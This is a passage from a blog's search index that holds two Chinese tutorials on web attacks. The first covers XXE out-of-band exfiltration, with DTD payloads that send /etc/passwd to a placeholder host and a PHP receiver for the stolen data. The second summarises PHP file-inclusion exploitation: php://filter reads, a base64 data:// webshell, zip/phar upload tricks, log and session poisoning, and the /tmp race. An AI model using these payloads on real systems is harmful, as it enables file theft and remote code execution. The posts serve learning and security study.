&quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;hosts&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;key.dtd&quot;&gt; </span><br><span class="line">%remote; </span><br><span class="line">%int;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><p>vps上的DTD文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>​</p><p><strong>读取限制</strong></p><p>当我们用该方法取读取大文件时会发现报错：</p><p><code>Detecated an entity reference loop in http……</code></p><p>原来libxml解析器默认限制外部实体长度为2k，没法突破，只能寻找一下压缩数据方面的。<a href="http://php.net/manual/zh/filters.compression.php" target="_blank" rel="noopener">php过滤器</a>中提供了一个<code>zlib.deflate</code>压缩数据。</p><p>因此我们只要将DTD文件修改成这样：    </p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;?p&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>​    之后再进行解压缩：</p><p><code>php://filter/read=convert.base64-decode/zlib.inflate/resource=file.txt</code></p><p><em>注</em> ：file.txt为你得到的压缩后的文件编码</p><ul><li><p>测试方法三：</p><p>在主机上放一个get.php用于接受文件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">file_put_contents(<span class="string">'01.txt'</span>, $_GET[<span class="string">'xxe'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>DTD文件修改如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;zlib.deflate&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;etc&#x2F;passwd&quot;&gt; </span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#39;http:&#x2F;&#x2F;xxx.xxx.xxx.xxx&#x2F;get.php?xxe&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>​</p></li></ul><p><img src="https://s1.ax1x.com/2018/03/31/9xm3C9.png" alt=""></p><p>我们打开<code>01.txt</code>就能看到编码后的文件了</p><p><img src="https://s1.ax1x.com/2018/03/31/9xml4J.png" alt=""></p><h4 id="XXE危害"><a href="#XXE危害" class="headerlink" title="#XXE危害"></a>#XXE危害</h4><ul><li>读取任意文件</li><li>执行系统命令</li><li>探查内网端口</li><li>攻击内网网址</li><li>DOS拒绝服务攻击</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含总结</title>
      <link href="/writing/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/"/>
      <url>/writing/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>时间长了，之前学的知识都忘光了。决定系统的总结一下各个模块的内容。</p><h2 id="0x02-简介"><a href="#0x02-简介" class="headerlink" title="0x02 简介"></a>0x02 简介</h2><p>在通过php的函数引入文件时，由于对传入的文件名没有进行有效的验证，进而导致了漏洞的产生。</p><p>几乎所有脚本语言都会提供文件包含的功能，但是文件包含漏洞在php中居多，其他语言中出现的要少得多，甚至没有，但这并不意味着其他语言中没有。</p><p>常见的文件包含函数：</p><ul><li>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li>require()：只要程序一运行就包含文件，找不到被包含文件时会产生致命错误，并停止脚本执行</li><li>Include_once()和require_once()：若文件中代码已被包含，则不会再次被包含</li></ul><p>由于远程文件包含需要<code>php.ini</code>中打开<code>allow_url_include = On</code>，而正常的服务器很少打开这个选项，所以，本地文件包含漏洞（Local File Inclusion）最为常见。</p><h2 id="0x03-常见的漏洞利用方法"><a href="#0x03-常见的漏洞利用方法" class="headerlink" title="0x03 常见的漏洞利用方法"></a>0x03 常见的漏洞利用方法</h2><h4 id="1-利用PHP伪协议"><a href="#1-利用PHP伪协议" class="headerlink" title="1. 利用PHP伪协议"></a>1. 利用PHP伪协议</h4><p>PHP中支持的伪协议由下面这么多:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsphp:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）glob:&#x2F;&#x2F; — 查找匹配的文件路径模式phar:&#x2F;&#x2F; — PHP 归档ssh2:&#x2F;&#x2F; — Secure Shell 2rar:&#x2F;&#x2F; — RARogg:&#x2F;&#x2F; — 音频流expect:&#x2F;&#x2F; — 处理交互式的流&#96;</span><br></pre></td></tr></table></figure><p>其中<code>php://</code>常用于文件包含漏洞中。下面对于常用的伪协议进行展开叙述：</p><ul><li><p>php://input</p><p><code>php://input</code>代表可以访问请求的原始数据，简单来说POST请求的情况下，<code>php://input</code>可以获取到<strong>post</strong>的数据。</p><p>比较特殊的一点，<code>enctype=”multipart/form-data”</code>的时候 <code>php://input</code> 是无效的。</p></li><li><p>php://filter</p><p><code>php://filter</code> 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 <code>readfile()</code>、 <code>file()</code>和 <code>file_get_contents()</code>， 在数据流内容读取之前没有机会应用其他过滤器。</p><p>事实上，在include函数的使用上，经常会造成任意文件读取漏洞，而<code>file_get_contents()</code>和<code>file_put_contents()</code>这样函数下，常常会构成getshell等更严重的漏洞。</p><p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p><p>文档里是这么写的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> 名称描述</span><br><span class="line">resource&#x3D;&lt;要过滤的数据流&gt;   这个参数是必须的。它指定了你要筛选过滤的数据流。</span><br><span class="line">read&#x3D;&lt;读链的筛选列表&gt;       该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">write&#x3D;&lt;写链的筛选列表&gt;   该参数可选。可以设定一个或多个过滤器名称，以管道符（|）分隔。</span><br><span class="line">&lt;；两个链的筛选列表&gt;       任何没有以 read&#x3D; 或 write&#x3D; 作前缀 的筛选器列表会视情况应用于读或写链。</span><br></pre></td></tr></table></figure><p>我们举一个例子，这是平时我们用来任意文件读取的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;upload.php</span><br></pre></td></tr></table></figure><p>这里读的过滤器为<code>convert.base64-encode</code>，就和字面上的意思一样，把输入流<code>base64-encode</code>。<br><code>resource=upload.php</code>，代表读取<code>upload.php</code>的内容</p><ul><li><p>过滤器：</p><ul><li><p>转换过滤器：<code>convert.base64-encode</code>、<code>convert.base64-decode</code></p></li><li><p>字符串过滤器： <code>string.rot13</code>,<code>string.toupper</code>,<code>string.tolower</code>,<code>string.strip_tags</code></p><p>string.strip_tags（自 PHP 5.0.0 起）使用此过滤器等同于用 strip_tags()函数处理所有的流数据。可以用两种格式接收参数：一种是和 strip_tags()函数第二个参数相似的一个包含有标记列表的字符串，一种是一个包含有标记名的数组。</p><p>strip_tags()返回给定的字符串 str 去除空字符、HTML 和 PHP 标记后的结果。</p></li><li><p>压缩过滤器： <code>zlib.deflate</code>和 <code>zlib.inflate</code>是主要的两个</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$params = <span class="keyword">array</span>(<span class="string">'level'</span> =&gt; <span class="number">6</span>, <span class="string">'window'</span> =&gt; <span class="number">15</span>, <span class="string">'memory'</span> =&gt; <span class="number">9</span>);</span><br><span class="line">$original_text = <span class="string">"This is a test.\nThis is only a test.\nThis is not an important string.\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The original text is "</span> . strlen($original_text) . <span class="string">" characters long.\n"</span>;</span><br><span class="line">$fp = fopen(<span class="string">'test.deflated'</span>, <span class="string">'w'</span>);</span><br><span class="line">stream_filter_append($fp, <span class="string">'zlib.deflate'</span>, STREAM_FILTER_WRITE, $params);</span><br><span class="line">fwrite($fp, $original_text);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The compressed file is "</span> . filesize(<span class="string">'test.deflated'</span>) . <span class="string">" bytes long.\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"The original text was:\n"</span>;</span><br><span class="line"><span class="comment">/* Use readfile and zlib.inflate to decompress on the fly */</span></span><br><span class="line">readfile(<span class="string">'php://filter/zlib.inflate/resource=test.deflated'</span>);</span><br><span class="line"><span class="comment">/* Generates output:</span></span><br><span class="line"><span class="comment">The original text is 70 characters long.</span></span><br><span class="line"><span class="comment">The compressed file is 56 bytes long.</span></span><br><span class="line"><span class="comment">The original text was:</span></span><br><span class="line"><span class="comment">This is a test.</span></span><br><span class="line"><span class="comment">This is only a test.</span></span><br><span class="line"><span class="comment">This is not an important string.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ul></li><li><p>data://</p><p><code>data://text/plain;base64,PD9waHAgZXZhbCgkX0dFVFsic2hlbGwiXSk7Pz4=</code></p></li><li><p>zip:// | phar://</p><p>如果漏洞代码更为严格，例如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>($_GET[<span class="string">'file'</span>] . <span class="string">'.php'</span>);</span><br></pre></td></tr></table></figure><p>也就是只包含后缀名为<code>php</code>的文件，那用我们刚才的方法直接包含图片文件就不行了，因为你传入<code>file=1.jpg</code>，到代码里就变为包含<code>1.jpg.php</code>，显然不存在这个文件。这种情况下，我们仍然可以利用<code>zip://</code>和<code>phar://</code>两种伪协议。</p><p>先写一个正常的php文件：<code>1.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后压缩进一个压缩包里面，然后把这个压缩包后缀名改为.jpg，在可以上传图片文件的地方上传，然后用伪协议包含：</p><p><code>file=zip://1.jpg%231</code>或<code>file=phar://1.jpg/1</code>这样后面的<code>1</code>后<code>.php</code>拼接，就能执行里面的PHP文件了。</p></li></ul><h4 id="2-包含日志文件"><a href="#2-包含日志文件" class="headerlink" title="2.包含日志文件"></a>2.包含日志文件</h4><ul><li><p>概述</p><p>当我们没有上传点，并且也没有url_allow_include功能时，我们就可以考虑包含服务器的日志文件。 </p><p>利用思路也比较简单，当我们访问网站时，服务器的日志中都会记录我们的行为，当我们访问链接中包含PHP一句话木马时，也会被记录到日志中。<br>这时候我们如果知道服务器的日志位置，我们可以去包含这个文件从而拿到shell。<br>其实整个“包含日志文件漏洞利用”最关键的就是找日志存放的“物理路径”，只要找到日志的物理存放路径，一切就可以按部就班的完成利用了。 </p></li><li><p>利用条件</p><p>1.日志的物理存放路径<br>2.存在文件包含漏洞<br>3.curl命令行url请求工具 或者 burpsuit代理；（避免url转码的存在）</p></li><li><p>常见的日志默认地址</p><p><strong>(1)apache+Linux日志默认路径</strong><br><code>/etc/httpd/logs/access_log</code> 或者 <code>/var/log/httpd/access_log</code></p><p><strong>(2)apache+Mac日志默认路径</strong><br><code>/var/log/apache2/access_log</code></p><p><strong>(3) apache+win2003日志默认路径</strong><br><code>D:\xampp\apache\logs\access.log</code><br><code>D:\xampp\apache\logs\error.log</code></p><p><strong>(4) IIS6.0+win2003默认日志文件</strong><br><code>C:\WINDOWS\system32\Logfiles</code></p><p><strong>(4) IIS7.0+win2003 默认日志文件</strong><br><code>%SystemDrive%\inetpub\logs\LogFiles</code></p><p><strong>(5) nginx 日志文件</strong><br>日志文件在用户安装目录logs目录下<br>例如安装目录<code>/usr/local/nginx</code><br>那我的日志目录就是在<code>/usr/local/nginx/logs</code>里</p></li><li><p>2.web中间件默认配置</p><p><strong>(1) apache+linux 默认配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#96; 或者 &#96;index.php?page&#x3D;&#x2F;etc&#x2F;init.d&#x2F;httpd</span><br></pre></td></tr></table></figure><p><strong>(2) IIS6.0+win2003 配置文件</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:&#x2F;Windows&#x2F;system32&#x2F;inetsrv&#x2F;metabase.xml</span><br></pre></td></tr></table></figure><p><strong>(3) IIS7.0+WIN 配置文件</strong><br><code>C:\Windows\System32\inetsrv\config\applicationHost.config</code></p></li><li><p>3.网站配置文件</p><p><strong>dedecms</strong> 数据库配置文件<code>data/common.inc.php</code>,</p><p><strong>discuz</strong> 全局配置文件<code>config/config_global.php</code>,</p><p><strong>phpcms</strong> 配置文件<code>caches/configs/database.php</code></p><p><strong>phpwind</strong> 配置文件<code>conf/database.php</code></p><p><strong>wordpress</strong> 配置文件<code>wp-config.php</code></p></li></ul><h4 id="3-包含session文件"><a href="#3-包含session文件" class="headerlink" title="3.包含session文件"></a>3.包含session文件</h4><p><code>session.upload_progress.enabled</code>这个参数在php.ini 默认开启，需要手动置为Off</p><p>如果不是Off，就会在上传的过程中生成上传进度文件，它的存储路径可以在phpinfo获取到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php5&#x2F;sess_&#123;your_php_session_id&#125;</span><br></pre></td></tr></table></figure><p>我们发现，如果我们的请求头中带着 <code>session.upload_progress.name</code> 的值，不管服务端PHP有没有开session，<br>只要我们在请求头中填上 PHPSESSID(符合格式，随便你怎么写),服务器就会根据我们这个 PHPSESSID 在session 文件的默认存放位置生成一个 session 文件。我们在文件中写入恶意代码，然后包含session文件就可以执行恶意代码了。</p><h4 id="4-包含-tmp文件"><a href="#4-包含-tmp文件" class="headerlink" title="4.包含/tmp文件"></a>4.包含/tmp文件</h4><p>向服务器上<strong>任意php</strong>文件以form-data方式提交请求上传数据时，会生成临时文件,通过phpinfo来获取临时文件的路径以及名称,然后临时文件在极短时间被删除的时候,需要竞争时间包含临时文件拿到webshell。</p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p>1.<a href="https://www.cnblogs.com/iamstudy/articles/include_file.html" target="_blank" rel="noopener">文件包含漏洞小结</a></p><p>2.<a href="https://xz.aliyun.com/t/2148#toc-4" target="_blank" rel="noopener">N1CTF Easy&amp;&amp;Hard Php Writeup</a></p><p>3.<a href="https://github.com/hxer/vulnapp/tree/master/lfi_phpinfo" target="_blank" rel="noopener">LFI with phpinfo</a></p><blockquote></blockquote>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> File_Inclusion </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
